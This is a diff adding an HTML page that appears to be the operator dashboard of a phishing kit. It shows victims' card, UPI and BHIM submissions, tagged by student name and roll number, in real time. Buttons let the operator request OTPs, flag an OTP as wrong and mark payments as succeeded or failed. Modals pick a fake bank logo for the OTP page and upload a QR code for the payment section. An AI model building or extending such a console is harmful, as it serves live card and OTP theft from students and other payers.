@@ -1,0 +1,544 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Admin Panel - Real-Time Submissions</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background: #000000;
+            color: #ffffff;
+            overflow: hidden;
+            height: 100vh;
+            display: flex;
+            flex-direction: column;
+        }
+
+        .header {
+            background: linear-gradient(135deg, #1a1a1a 0%, #000000 100%);
+            padding: 12px 30px;
+            border-bottom: 1px solid #333;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            flex-shrink: 0;
+        }
+
+        .logo {
+            font-size: 20px;
+            font-weight: bold;
+            color: #00ff00;
+        }
+
+        .status-section {
+            display: flex;
+            gap: 20px;
+            align-items: center;
+            font-size: 12px;
+        }
+
+        .status-dot {
+            width: 8px;
+            height: 8px;
+            border-radius: 50%;
+            background: #00ff00;
+            display: inline-block;
+            animation: pulse 2s infinite;
+        }
+
+        @keyframes pulse {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.5; }
+        }
+
+        .main-container {
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            padding: 15px 30px;
+            overflow: hidden;
+        }
+
+        .page-header {
+            flex-shrink: 0;
+            margin-bottom: 15px;
+        }
+
+        .page-title {
+            font-size: 24px;
+            font-weight: bold;
+            color: #00ff00;
+            margin-bottom: 5px;
+        }
+
+        .page-subtitle {
+            font-size: 12px;
+            color: #888;
+        }
+
+        .submissions-container {
+            flex: 1;
+            overflow-y: auto;
+            overflow-x: hidden;
+        }
+
+        .submissions-container::-webkit-scrollbar {
+            width: 8px;
+        }
+
+        .submissions-container::-webkit-scrollbar-track {
+            background: #1a1a1a;
+        }
+
+        .submissions-container::-webkit-scrollbar-thumb {
+            background: #333;
+            border-radius: 4px;
+        }
+
+        .submissions-container::-webkit-scrollbar-thumb:hover {
+            background: #555;
+        }
+
+        .empty-state {
+            text-align: center;
+            padding: 60px 20px;
+            color: #666;
+        }
+
+        .submissions-table {
+            width: 100%;
+            border-collapse: collapse;
+            font-size: 11px;
+        }
+
+        .submissions-table thead {
+            position: sticky;
+            top: 0;
+            background: #1a1a1a;
+            z-index: 10;
+        }
+
+        .submissions-table th {
+            padding: 8px 6px;
+            text-align: left;
+            font-weight: 600;
+            color: #00ff00;
+            border-bottom: 1px solid #333;
+            font-size: 10px;
+            text-transform: uppercase;
+        }
+
+        .submissions-table td {
+            padding: 8px 6px;
+            border-bottom: 1px solid #222;
+            white-space: nowrap;
+            overflow: hidden;
+            text-overflow: ellipsis;
+            max-width: 150px;
+        }
+
+        .submissions-table tr {
+            transition: background 0.2s;
+        }
+
+        .submissions-table tbody tr:hover {
+            background: #1a1a1a;
+        }
+
+        .submissions-table tbody tr.new {
+            background: rgba(255, 0, 0, 0.1);
+            animation: fadeIn 0.5s;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(-10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .type-badge {
+            display: inline-block;
+            padding: 3px 8px;
+            border-radius: 3px;
+            font-size: 9px;
+            font-weight: bold;
+            text-transform: uppercase;
+        }
+
+        .type-card {
+            background: #1a4d8f;
+            color: #4da6ff;
+        }
+
+        .type-upi {
+            background: #4d1a8f;
+            color: #a64dff;
+        }
+
+        .type-bhim {
+            background: #8f4d1a;
+            color: #ffa64d;
+        }
+
+        .status-badge {
+            display: inline-block;
+            padding: 3px 8px;
+            border-radius: 3px;
+            font-size: 9px;
+            font-weight: bold;
+            text-transform: uppercase;
+        }
+
+        .status-processing {
+            background: #1a4d8f;
+            color: #4da6ff;
+        }
+
+        .status-completed {
+            background: #0d4d0d;
+            color: #00ff00;
+        }
+
+        .status-failed {
+            background: #4d0d0d;
+            color: #ff4444;
+        }
+
+        .status-invalid {
+            background: #4d3d0d;
+            color: #ff8800;
+        }
+
+        .commands-cell {
+            display: flex;
+            gap: 4px;
+            flex-wrap: nowrap;
+        }
+
+        .command-btn {
+            padding: 4px 8px;
+            border: none;
+            border-radius: 3px;
+            cursor: pointer;
+            font-size: 9px;
+            font-weight: 600;
+            transition: all 0.2s;
+            white-space: nowrap;
+        }
+
+        .command-btn:hover:not(:disabled) {
+            transform: scale(1.05);
+        }
+
+        .command-btn:disabled {
+            opacity: 0.3;
+            cursor: not-allowed;
+        }
+
+        .btn-otp {
+            background: #9333ea;
+            color: white;
+        }
+
+        .btn-success {
+            background: #00aa00;
+            color: white;
+        }
+
+        .btn-fail {
+            background: #cc0000;
+            color: white;
+        }
+
+        .btn-invalid {
+            background: #ff8800;
+            color: white;
+        }
+
+        .otp-display {
+            display: inline-flex;
+            align-items: center;
+            gap: 6px;
+            background: rgba(147, 51, 234, 0.2);
+            padding: 4px 8px;
+            border-radius: 4px;
+            font-size: 10px;
+            margin-top: 4px;
+        }
+
+        .otp-value {
+            font-weight: bold;
+            color: #9333ea;
+            font-family: 'Courier New', monospace;
+        }
+
+        .wrong-otp-btn {
+            padding: 2px 6px;
+            background: #cc0000;
+            color: white;
+            border: none;
+            border-radius: 3px;
+            font-size: 8px;
+            cursor: pointer;
+            font-weight: 600;
+        }
+
+        .wrong-otp-btn:disabled {
+            opacity: 0.3;
+            cursor: not-allowed;
+        }
+
+        .amount-cell {
+            color: #00ff00;
+            font-weight: bold;
+            font-family: 'Courier New', monospace;
+        }
+
+        .session-id {
+            font-family: 'Courier New', monospace;
+            color: #666;
+            font-size: 10px;
+        }
+
+        .student-name {
+            color: #ffffff;
+            font-weight: 600;
+        }
+
+        .roll-number {
+            color: #888;
+        }
+
+        .card-number {
+            font-family: 'Courier New', monospace;
+            color: #aaa;
+        }
+
+        .time-cell {
+            color: #666;
+            font-size: 10px;
+        }
+
+        .new-indicator {
+            color: #00ff00;
+            font-weight: bold;
+            animation: blink 1s infinite;
+        }
+
+        @keyframes blink {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.3; }
+        }
+
+        .delete-all-btn {
+            background: #dc2626;
+            color: white;
+            border: none;
+            padding: 8px 16px;
+            border-radius: 6px;
+            font-size: 13px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.2s;
+            margin-left: 20px;
+        }
+
+        .delete-all-btn:hover {
+            background: #b91c1c;
+            transform: scale(1.05);
+        }
+
+        .delete-all-btn:active {
+            transform: scale(0.95);
+        }
+
+        .performance-monitor {
+            position: relative;
+            width: 45px;
+            height: 45px;
+            margin-left: 20px;
+            margin-top: 0px;
+        }
+
+        .performance-circle {
+            width: 100%;
+            height: 100%;
+            transform: rotate(-90deg);
+        }
+
+        .performance-bg {
+            fill: none;
+            stroke: #1a1a1a;
+            stroke-width: 3;
+        }
+
+        .performance-bar {
+            fill: none;
+            stroke: #00ff00;
+            stroke-width: 3;
+            stroke-linecap: round;
+            transition: stroke-dasharray 0.4s ease-in-out, stroke 0.3s ease;
+        }
+
+        .performance-text {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            font-size: 14px;
+            font-weight: bold;
+            color: #00ff00;
+        }
+
+        .performance-label {
+            position: absolute;
+            bottom: -18px;
+            left: 50%;
+            transform: translateX(-50%);
+            font-size: 9px;
+            color: #888;
+            white-space: nowrap;
+        }
+
+        .socket-monitor {
+            position: relative;
+            width: 45px;
+            height: 45px;
+            margin-left: 15px;
+            margin-top: 0px;
+        }
+
+        .socket-circle {
+            width: 100%;
+            height: 100%;
+            transform: rotate(-90deg);
+        }
+
+        .socket-bg {
+            fill: none;
+            stroke: #1a1a1a;
+            stroke-width: 3;
+        }
+
+        .socket-bar {
+            fill: none;
+            stroke: #00aaff;
+            stroke-width: 3;
+            stroke-linecap: round;
+            transition: stroke-dasharray 0.4s ease-in-out, stroke 0.3s ease;
+        }
+    </style>
+</head>
+<body>
+    <!-- Header -->
+    <header class="header">
+        <div style="display: flex; align-items: center;">
+            <div class="logo">? Admin Panel</div>
+            <div class="performance-monitor" title="Server Performance (CPU Usage)">
+                <svg class="performance-circle" viewBox="0 0 36 36">
+                    <path class="performance-bg" d="M18 2.0845 a 15.9155 15.9155 0 0 1 0 31.831 a 15.9155 15.9155 0 0 1 0 -31.831"/>
+                    <path class="performance-bar" id="performanceBar" stroke-dasharray="0, 100" d="M18 2.0845 a 15.9155 15.9155 0 0 1 0 31.831 a 15.9155 15.9155 0 0 1 0 -31.831"/>
+                </svg>
+            </div>
+            <div class="socket-monitor" title="WebSocket Connection Status">
+                <svg class="socket-circle" viewBox="0 0 36 36">
+                    <path class="socket-bg" d="M18 2.0845 a 15.9155 15.9155 0 0 1 0 31.831 a 15.9155 15.9155 0 0 1 0 -31.831"/>
+                    <path class="socket-bar" id="socketBar" stroke-dasharray="0, 100" d="M18 2.0845 a 15.9155 15.9155 0 0 1 0 31.831 a 15.9155 15.9155 0 0 1 0 -31.831"/>
+                </svg>
+            </div>
+        </div>
+        <div class="status-section">
+            <button onclick="openQrUploadModal()" style="padding: 8px 16px; background: #0088ff; color: white; border: 1px solid #00aaff; border-radius: 4px; cursor: pointer; font-size: 12px; font-weight: 600; margin-right: 10px;">?? Upload QR</button>
+            <button id="deleteAllBtn" class="delete-all-btn" onclick="deleteAllSubmissions()">??? DELETE ALL</button>
+            <div><span class="status-dot"></span> <span>Live</span></div>
+            <div id="connectionCount">Connections: 0</div>
+        </div>
+    </header>
+
+    <!-- Main Container -->
+    <div class="main-container">
+
+        <!-- Submissions Container with Scrolling -->
+        <div class="submissions-container">
+            <div class="empty-state" id="emptyState">
+                <div style="font-size: 48px; margin-bottom: 10px;">??</div>
+                <div style="font-size: 18px; font-weight: 600; margin-bottom: 5px;">No Submissions Yet</div>
+                <div style="font-size: 12px;">Submissions will appear here in real-time</div>
+            </div>
+            
+            <table class="submissions-table" id="submissionsTable" style="display: none;">
+                <thead>
+                    <tr>
+                        <th style="width: 40px;">NEW</th>
+                        <th style="width: 50px;">TYPE</th>
+                        <th style="width: 100px;">SESSION ID</th>
+                        <th style="width: 150px;">STUDENT</th>
+                        <th style="width: 100px;">ROLL NO</th>
+                        <th style="width: 250px;">DETAILS</th>
+                        <th style="width: 100px;">AMOUNT</th>
+                        <th style="width: 70px;">TIME</th>
+                        <th style="width: 80px;">STATUS</th>
+                        <th style="width: 280px;">ACTIONS</th>
+                    </tr>
+                </thead>
+                <tbody id="submissionsTableBody">
+                </tbody>
+            </table>
+        </div>
+    </div>
+
+    <script src="/socket.io/socket.io.js"></script>
+    <script src="admin.js"></script>
+
+    <!-- Bank Selection Modal -->
+    <div id="bankSelectionModal" style="display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.9); z-index: 10000; justify-content: center; align-items: center;">
+        <div style="background: #1a1a1a; border: 2px solid #00ff00; border-radius: 8px; padding: 30px; max-width: 500px; width: 90%;">
+            <h2 style="color: #00ff00; margin-bottom: 20px; text-align: center;">Select Bank Logo</h2>
+            <p style="color: #888; margin-bottom: 20px; text-align: center; font-size: 12px;">Choose which bank logo to display on OTP page</p>
+            <div id="bankOptions" style="display: grid; gap: 10px;"></div>
+            <button onclick="closeBankModal()" style="width: 100%; margin-top: 20px; padding: 12px; background: #333; color: white; border: 1px solid #555; border-radius: 4px; cursor: pointer;">Cancel</button>
+        </div>
+    </div>
+
+    <!-- Bank Selection Modal -->
+    <div id="bankSelectionModal" style="display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.9); z-index: 10000; justify-content: center; align-items: center;">
+        <div style="background: #1a1a1a; border: 2px solid #00ff00; border-radius: 8px; padding: 30px; max-width: 500px; width: 90%;">
+            <h2 style="color: #00ff00; margin-bottom: 20px; text-align: center;">Select Bank Logo</h2>
+            <p style="color: #888; margin-bottom: 20px; text-align: center; font-size: 12px;">Choose which bank logo to display on OTP page</p>
+            <div id="bankOptions" style="display: grid; gap: 10px;"></div>
+            <button onclick="closeBankModal()" style="width: 100%; margin-top: 20px; padding: 12px; background: #333; color: white; border: 1px solid #555; border-radius: 4px; cursor: pointer;">Cancel</button>
+        </div>
+    </div>
+
+    <!-- QR Code Upload Modal -->
+    <div id="qrUploadModal" style="display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.9); z-index: 10000; justify-content: center; align-items: center;">
+        <div style="background: #1a1a1a; border: 2px solid #0088ff; border-radius: 8px; padding: 30px; max-width: 500px; width: 90%;">
+            <h2 style="color: #0088ff; margin-bottom: 20px; text-align: center;">?? Upload QR Code</h2>
+            <p style="color: #888; margin-bottom: 20px; text-align: center; font-size: 12px;">Upload a QR code image to display on the UPI payment section</p>
+            
+            <div style="margin-bottom: 20px;">
+                <input type="file" id="qrFileInput" accept="image/*" style="display: none;" onchange="previewQrCode(event)">
+                <button onclick="document.getElementById('qrFileInput').click()" style="width: 100%; padding: 12px; background: #0088ff; color: white; border: 1px solid #00aaff; border-radius: 4px; cursor: pointer; font-weight: 600;">Choose QR Code Image</button>
+            </div>
+            
+            <div id="qrPreviewContainer" style="display: none; margin-bottom: 20px; text-align: center;">
+                <p style="color: #888; font-size: 12px; margin-bottom: 10px;">Preview:</p>
+                <img id="qrPreview" style="max-width: 250px; max-height: 250px; border: 2px solid #0088ff; border-radius: 8px; background: white; padding: 10px;">
+            </div>
+            
+            <div style="display: flex; gap: 10px;">
+                <button id="uploadQrButton" onclick="uploadQrCode()" style="flex: 1; padding: 12px; background: #00ff00; color: #000; border: 1px solid #00ff00; border-radius: 4px; cursor: pointer; font-weight: 600;" disabled>Upload</button>
+                <button onclick="closeQrUploadModal()" style="flex: 1; padding: 12px; background: #333; color: white; border: 1px solid #555; border-radius: 4px; cursor: pointer;">Cancel</button>
+            </div>
+            
+            <div id="qrUploadStatus" style="margin-top: 15px; text-align: center; font-size: 12px;"></div>
+        </div>
+    </div>
+</body>
+</html>
